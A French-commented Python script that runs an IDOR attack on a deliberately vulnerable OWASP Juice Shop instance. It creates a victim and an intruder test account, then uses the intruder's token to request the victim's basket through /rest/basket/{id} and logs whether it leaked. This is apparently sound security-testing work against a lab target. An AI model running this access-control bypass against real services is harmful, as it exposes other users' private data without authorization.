"""Attaque IDOR sur Juice Shop (cible volontairement vulnérable, déployée par l'équipe).
Schéma P7/P1 du playbook : l'intrus lit le PANIER d'un autre utilisateur via l'API /rest/basket/{id}.
Le code attaque et décide (rejeu). Comptes de test créés à la volée (aucune donnée réelle).
Usage : python juiceshop_idor.py <url_juiceshop>
"""
import datetime as dt, json, secrets, sys

import httpx


def creer_compte(base, email, mdp):
    httpx.post(base + "/api/Users", timeout=30,
               json={"email": email, "password": mdp, "passwordRepeat": mdp,
                     "securityQuestion": {"id": 2}, "securityAnswer": "test"})
    r = httpx.post(base + "/rest/user/login", timeout=30, json={"email": email, "password": mdp})
    r.raise_for_status()
    a = r.json()["authentication"]
    return a["token"], a["bid"], a["umail"]


def panier(base, token, bid):
    return httpx.get(base + f"/rest/basket/{bid}", timeout=30,
                     headers={"Authorization": "Bearer " + token})


def main(base):
    base = base.rstrip("/")
    tag = dt.datetime.now().strftime("%H%M%S")
    A = f"victime-{tag}@juice.test"
    B = f"intrus-{tag}@juice.test"
    pwA, pwB = "JsTest!" + secrets.token_hex(5), "JsTest!" + secrets.token_hex(5)

    tokA, bidA, mailA = creer_compte(base, A, pwA)
    tokB, bidB, mailB = creer_compte(base, B, pwB)
    print(f"Victime  A : {mailA}  (panier #{bidA})")
    print(f"Intrus   B : {mailB}  (panier #{bidB})\n")

    # A met un article identifiable dans SON panier
    httpx.post(base + "/api/BasketItems", timeout=30, headers={"Authorization": "Bearer " + tokA},
               json={"BasketId": bidA, "ProductId": 1, "quantity": 3})
    ref = panier(base, tokA, bidA).json()
    art_A = [p.get("name") for p in ref.get("data", {}).get("Products", [])]
    print(f"Panier de A (référence) : {art_A}")

    # ATTAQUE : B, avec SON token, demande le panier de A
    r = panier(base, tokB, bidA)
    print(f"\n── B demande GET /rest/basket/{bidA} (le panier de A) ──")
    print(f"HTTP {r.status_code}")
    fuite = False
    if r.status_code == 200:
        vus = [p.get("name") for p in r.json().get("data", {}).get("Products", [])]
        print(f"B reçoit le panier : {vus}")
        fuite = bool(vus) and set(vus) & set(art_A)
    else:
        print(f"Refusé : {r.text[:120]}")

    print("\n" + "=" * 60)
    if fuite:
        print("⚠️  FUITE IDOR PROUVÉE : l'intrus B lit le panier privé de A via l'API.")
        print("    Schéma P7 (API non protégée) / P1 (IDOR par identifiant). Faille réelle.")
    else:
        print("Pas de fuite : l'API vérifie la propriété du panier.")
    out = {"cible": base, "victime": mailA, "intrus": mailB, "panier_A": bidA,
           "articles_A": art_A, "http_intrus": r.status_code,
           "verdict": "fuite_idor" if fuite else "protege", "date": dt.datetime.now().isoformat(timespec="seconds")}
    import pathlib
    f = pathlib.Path("resultats") / f"juiceshop_idor_{tag}.json"
    f.write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"→ {f.name}")


if __name__ == "__main__":
    main(sys.argv[1])
